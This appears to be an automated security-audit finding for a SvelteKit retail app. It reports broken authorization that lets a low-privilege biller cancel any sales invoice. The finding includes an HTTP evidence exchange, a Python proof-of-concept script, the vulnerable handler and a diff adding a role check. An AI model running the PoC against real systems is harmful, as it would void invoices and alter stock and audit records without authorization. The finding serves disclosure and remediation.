# Broken Function Level Authorization and IDOR in /api/sales/[id]/cancel

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-11-01 13:02:27 UTC
**Target:** http://host.docker.internal:5173
**Endpoint:** /api/sales/[id]/cancel
**Method:** POST
**CWE:** CWE-862
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The sales invoice cancellation endpoint does not enforce role-based access control or tenant isolation, allowing low-privilege counter billers to cancel any sales invoice across the system.

## Evidence

Cancelling an invoice using the low-privilege biller session returns HTTP 200 OK:
```http
POST /api/sales/88aac12a-89c2-45e0-a8d7-4c86a3c8df3d/cancel HTTP/1.1
Host: host.docker.internal:5173
Cookie: sessionId=8530a358db46e439bdb28bcd756932102764c1e2f6c43c4ebe4b0035da6f7ff0

HTTP/1.1 200 OK
Content-Type: application/json

{"id":"88aac12a-89c2-45e0-a8d7-4c86a3c8df3d","invoiceNumber":"INV-000038","status":"cancelled",...}
```
The status was changed to `cancelled` and batch inventory was restored without admin authorization.

## Impact

An authenticated attacker with the low-privilege `biller` role can cancel arbitrary confirmed sales invoices without administrative authorization. Cancelling an invoice restores inventory batch quantities, creates adjustment stock events, updates outbox synchronization, and alters statutory audit logs without store owner approval.

## Counterevidence

Checked whether hooks.server.ts or salesService enforces role restrictions on sales cancellation. Confirmed that hooks.server.ts only validates session existence, and neither the route handler nor DbSaleRepository.updateStatus validates role or tenant ownership. Dynamically executed cancellation using the biller account and confirmed invoice cancellation, stock restoration, and audit log mutation.

## What Would Change This Severity

If counter billers were granted explicit business authority to void retail tickets under store policy, severity would decrease to Medium; however, missing multi-tenant storeId validation still allows unauthorized cross-tenant cancellation.

## Technical Analysis

In `src/routes/api/sales/[id]/cancel/+server.ts`:
The handler only verifies that a session exists (`if (!locals.user)`). Unlike `src/routes/api/purchases/[id]/cancel/+server.ts`, which restricts cancellation to `owner_admin`, `src/routes/api/sales/[id]/cancel/+server.ts` completely omits any role check. Furthermore, neither the route handler nor `salesService.cancelSale(params.id)` validates that the target invoice belongs to the caller's store (`sale.storeId === locals.user.storeId`). Consequently, any biller can cancel any sale by ID.

When `cancelSale` executes, `DbSaleRepository.updateStatus` marks the invoice as `'cancelled'`, restores batch stock quantities in `batchesTable`, inserts adjustment records in `batchStockEventsTable`, logs sync events in `syncOutboxTable`, and records a cancellation entry in `auditLogTable`.

## Proof of Concept

1. Log in as an administrator (owner_admin) and create a sales invoice via `POST /api/sales`.
2. Note the generated invoice ID (e.g. `88aac12a-89c2-45e0-a8d7-4c86a3c8df3d`).
3. Log in as a low-privilege counter biller (`role: biller`) to obtain a biller session cookie.
4. Send a `POST` request to `/api/sales/<sale_id>/cancel` using the biller's session cookie.
5. Observe that the server returns HTTP 200 OK with the sale status updated to `cancelled`, and batch stock restored.

```python
import requests

BASE_URL = "http://host.docker.internal:5173"

# 1. Log in as biller
session = requests.Session()
login_res = session.post(
    f"{BASE_URL}/login",
    data={"username": "biller", "password": "biller123"}
)
assert login_res.status_code == 200, f"Login failed: {login_res.status_code}"

# 2. Query sales to find a confirmed invoice
sales_res = session.get(f"{BASE_URL}/api/sales")
sales = sales_res.json()
confirmed_sale = next((s for s in sales if s.get("status") == "confirmed"), None)
assert confirmed_sale is not None, "No confirmed sale found"
sale_id = confirmed_sale["id"]

# 3. Cancel the confirmed sale as biller
cancel_res = session.post(f"{BASE_URL}/api/sales/{sale_id}/cancel")
print("Status code:", cancel_res.status_code)
print("Response:", cancel_res.json())
assert cancel_res.status_code == 200
assert cancel_res.json().get("status") == "cancelled"
print(f"Successfully cancelled sale {sale_id} as low-privilege biller!")
```

## Code Analysis

**Location 1:** `src/routes/api/sales/[id]/cancel/+server.ts` (lines 4-11)
  Enforce owner_admin role check on sales cancellation
  ```
  export async function POST({ params, locals }) {
  	if (!locals.user) {
  		return new Response('Unauthorized', { status: 401 });
  	}
  
  	const sale = await salesService.cancelSale(params.id);
  	return json(sale);
  }
  ```

  **Suggested Fix:**
```diff
- export async function POST({ params, locals }) {
- 	if (!locals.user) {
- 		return new Response('Unauthorized', { status: 401 });
- 	}
- 
- 	const sale = await salesService.cancelSale(params.id);
- 	return json(sale);
- }
+ export async function POST({ params, locals }) {
+ 	if (!locals.user) {
+ 		return new Response('Unauthorized', { status: 401 });
+ 	}
+ 
+ 	if (locals.user.role !== 'owner_admin') {
+ 		return new Response(JSON.stringify({ error: 'Forbidden: Admin role required' }), {
+ 			status: 403,
+ 			headers: { 'Content-Type': 'application/json' }
+ 		});
+ 	}
+ 
+ 	const sale = await salesService.cancelSale(params.id);
+ 	return json(sale);
+ }
```

## Remediation

In `src/routes/api/sales/[id]/cancel/+server.ts`, verify that `locals.user.role === 'owner_admin'`. If not, return a 403 Forbidden response. Additionally, ensure the sale belongs to the user's `storeId` before executing the cancellation.

## Fix Verification

Gate 1 (Applicability): Verified line numbers 4-11 match verbatim in src/routes/api/sales/[id]/cancel/+server.ts.
Gate 2 (Security closure): With the check added, requests from biller receive HTTP 403 Forbidden before salesService.cancelSale is reached.
Gate 3 (Bypass review): Mirrors the working authorization guard in src/routes/api/purchases/[id]/cancel/+server.ts.
Gate 4 (Preserved behavior): Administrative users (owner_admin) can still cancel sales invoices as expected.
Gate 5 (Repository checks): Syntactically valid TypeScript matching SvelteKit RequestHandler convention.

Assumes an authenticated attacker with low-privilege 'biller' credentials.
